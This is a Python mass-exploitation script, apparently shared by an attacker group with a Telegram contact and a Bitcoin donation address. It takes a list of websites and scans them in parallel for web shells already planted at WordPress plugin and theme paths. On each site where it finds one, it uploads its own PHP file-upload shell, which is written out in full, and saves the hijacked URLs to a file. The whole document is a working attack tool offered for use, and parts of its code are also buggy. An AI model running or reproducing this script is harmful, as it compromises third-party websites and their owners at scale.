import sys , os,requests, re, random, string
from multiprocessing.dummy import Pool
from colorama import Fore
from colorama import init 
init(autoreset=True)

#Coded By h0rn3t sp1d3rs 

fr  =   Fore.RED

fg  =   Fore.GREEN
os.system("clear")


banner = """{}
 ____ _______ _____   ____   ____ _______
|  _ \__   __/ ____| |  _ \ / __ \__   __|
| |_) | | | | (___   | |_) | |  | | | |
|  _ <  | |  \___ \  |  _ <| |  | | | |
| |_) | | |  ____) | | |_) | |__| | | |
|____/  |_| |_____/  |____/ \____/  |_|
			   1.0 VERSION
	[ POWERFUL WP EXPLOIT ]
   Developed By H0RN3T SP1D3RS
         Tg: https://t.me/h0rn3t_sp1d3r
 Donate(BTC): 17nRr6QzzCAXrkZxsytnMqvgN3aEGixJef
\n""".format(fg)

print (banner)

requests.urllib3.disable_warnings()

 
filename = input("\u001b[33m  [×] Enter Site List: \u001b[32m")
target = open(filename).read().split()

class MyVzla:

	def __init__(self):

		self.headers = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36'}

		self.shell_content = """<h0rn3t sp1d3rs<?php echo '<pre>'.php_uname()."\n".'<br/><form method="post" enctype="multipart/form-data"><input type="file" name="__"><input name="_" type="submit" value="Upload"></form>';if($_POST){if(@copy($_FILES['__']['tmp_name'], $_FILES['__']['name'])){echo 'OK';}else{echo 'ER';}}?>"""

		

	def ran(self, length):

		letters = string.ascii_lowercase

		return ''.join(random.choice(letters) for i in range(length))


	def URLdomain(self, site):



		if site.startswith("http://") :

			site = site.replace("http://","")

		elif site.startswith("https://") :

			site = site.replace("https://","")

		else :

			pass

		pattern = re.compile('(.*)/')

		while re.findall(pattern,site):

			sitez = re.findall(pattern,site)

			site = sitez[0]

		return site

	



			

			

			

	def Vz1(self, url):

		try:

			url = 'http://' + self.URLdomain(url)

			filename = "vz" + self.ran(3) + ".php"

			check_request = requests.get(url + "/wp-content/plugins/ccx/index.php",headers=self.headers, allow_redirects=True,verify=False ,timeout=15).content

			

			if('Negat1ve Shell' in check_request):

				print("\u001b[32m[Succefully] => \u001b[0m" +url)

				open('shells.txt','a').write(url + '/wp-content/plugins/ccx/index.php' +  "\n")

				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',

													 'Content-Type':'multipart/form-data; boundary=---------------------------129599211415792452902228837254'}

				data = '-----------------------------129599211415792452902228837254\r\n'

				data += 'Content-Disposition: form-data; name="uploadfile[]"; filename="{}"\r\n'.format(filename)

				data += 'Content-Type: application/octet-stream\r\n'

				data += '\r\n'

				data += '{}\r\n'.format(self.shell_content)

				data += '-----------------------------129599211415792452902228837254--\r\n'

				Upload = requests.post(url + '/wp-content/plugins/ccx/index.php', data=data, headers=headersup).content

				Check_Shell = requests.get(url + '/wp-content/plugins/ccx/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content

				if('h0rn3t sp1d3rs' in Check_Shell):

					print("\u001b[32m[Succefully] => \u001b[0m" +url)

					open('shells.txt','a').write(url + '/wp-content/plugins/ccx/' + filename + "\n")

				else:

					print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

					

					

			else:

				print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

		except:

			print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

			

			

	def Vz2(self, url):

		try:

			url = 'http://' + self.URLdomain(url)

			filename = "vz" + self.ran(3) + ".php"

			check_request = requests.get(url + "/ccx/index.php",headers=self.headers, allow_redirects=True,verify=False ,timeout=15).content

			

			if('Negat1ve Shell' in check_request):

				

				print("\u001b[32m[Succefully] => \u001b[0m" +url)

				open('shells.txt','a').write(url + '/ccx/index.php' +  "\n")


				Check_Shell = requests.get(url + '/js/rttx.php' ,headers=self.headers, allow_redirects=True,timeout=15).content

				if Check_Shell.status_code == 200:

					print("{} {}[Succefully]").format(url)

					open('shells.txt','a').write(url +"/js/rttx.php \n")

				else:

					print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

					

					

			else:

				print("\u001b[31m [Failed ] ==> \u001b[0m" +url )
				

		except:

			print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

			

			

	def Vz3(self, url):

		try:

			url = 'http://' + self.URLdomain(url)

			filename = "vz" + self.ran(3) + ".php"

			check_request = requests.get(url + "/wp-content/plugins/ccx/index.php",headers=self.headers, allow_redirects=True,verify=False ,timeout=15).content

			

			if('Negat1ve Shell' in check_request):

				

				print("\u001b[32m[Succefully] => \u001b[0m" +url)

				open('shells.txt','a').write(url + '/wp-content/plugins/ccx/index.php' +  "\n")

				Check_Shell = requests.get(url + '/wp-content/plugins/seoplugins/db.php?u' ,headers=self.headers, allow_redirects=True,timeout=15).content

				if('<input name="_upl" type="submit" id="_upl" value="Upload">' in Check_Shell):

					print("{} {}[Succefully]").format(url)

					open('shells.txt','a').write(url + '/wp-content/plugins/seoplugins/db.php?u' +"\n")

				else:

					print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

					

					

			else:

				print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

		except:

			print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

	

	

	def Vz5(self, url):

		try:

			url = 'http://' + self.URLdomain(url)

			filename = "vz" + self.ran(3) + ".php"

			check_request = requests.get(url + "/index.php?3x=3x",headers=self.headers, allow_redirects=True,verify=False ,timeout=15).content

			

			if('<title>Upload files...</title>' in check_request):

				

				print("\u001b[32m[Succefully] => \u001b[0m" +url)

				open('shells.txt','a').write(url + '/index.php?3x=3x' +  "\n")


				Check_Shell = requests.get(url +'/css/admin/content.php' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content

				if("<input type=hidden name=p1 value='uploadFile'>" in Check_Shell):

					print("\u001b[32m[Succefully] => \u001b[0m" +url)

					open('shells.txt','a').write(url + '/css/admin/content.php \n')

				else:

					print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

					

					

			else:

				print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

		except:

			print("\u001b[31m [Failed ] ==> \u001b[0m" +url )


	#
	def Vz6(self, url):

		try:

			url = 'http://' + self.URLdomain(url)

			filename = "vz" + self.ran(3) + ".php"

			check_request = requests.get(url + "/shell.php",headers=self.headers, allow_redirects=True,verify=False ,timeout=15).content

			

			if("<input type=hidden name=p1 value='uploadFile'>" in check_request):

				

				print("\u001b[32m[Succefully] => \u001b[0m" +url)

				open('shells.txt','a').write(url + '/shell.php' +  "\n")


				Check_Shell = requests.get(url +'/wp-content/plugins/seoplugins/mar.php' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content

				if("//0x5a455553.github.io/MARIJUANA/icon.png" in Check_Shell):

					print("\u001b[32m[Succefully] => \u001b[0m" +url)

					open('shells.txt','a').write(url + '/wp-content/plugins/seoplugins/mar.php \n')

				else:

					print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

					

					

			else:

				print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

		except:

			print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

	#
	#
	#
	def Vz4(self, url):

		try:

			url = 'http://' + self.URLdomain(url)

			filename = "vz" + self.ran(3) + ".php"

			check_request = requests.get(url + "/wp-content/themes/ccx/index.php",headers=self.headers, allow_redirects=True,verify=False ,timeout=15).content

			

			if('Negat1ve Shell' in check_request):

				

				print("\u001b[32m[Succefully] => \u001b[0m" +url)

				open('shells.txt','a').write(url + '/wp-content/themes/ccx/index.php' +  "\n")

				headersup = {'User-Agent': 'Mozlila/5.0 (Linux; Android 7.0; SM-G892A Bulid/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Moblie Safari/537.36',

													 'Content-Type':'multipart/form-data; boundary=---------------------------388099077217067024982386994805'}

				data = '-----------------------------388099077217067024982386994805\r\n'

				data += 'Content-Disposition: form-data; name="uploadfile[]"; filename="{}"\r\n'.format(filename)

				data += 'Content-Type: text/plain\r\n'

				data += '\r\n'

				data += '{}\r\n'.format(self.shell_content)

				data += '-----------------------------388099077217067024982386994805--\r\n'

				Upload = requests.post(url + '/wp-content/themes/ccx/index.php', data=data, headers=headersup).content

				Check_Shell = requests.get(url + '/wp-content/themes/ccx/' + filename ,headers=self.headers, allow_redirects=True,timeout=15).content

				if('h0rn3t sp1d3rs' in Check_Shell):

					print("\u001b[32m[Succefully] => \u001b[0m" +url)

					open('shells.txt','a').write(url + '/wp-content/themes/ccx/' + filename + "\n")

				else:

					print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

					

					

			else:
				print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

		except:

			print("\u001b[31m [Failed ] ==> \u001b[0m" +url )

See = MyVzla()	

def RunMyCode(site):

	try:
		See.Vz1(site)
		See.Vz2(site)
		See.Vz3(site)
		See.Vz4(site)
		See.Vz5(site)
		

	except:

		pass

#Developed by h0rn3t sp1d3rs 

mp = Pool(100)

mp.map(RunMyCode, target)

mp.close()

mp.join()
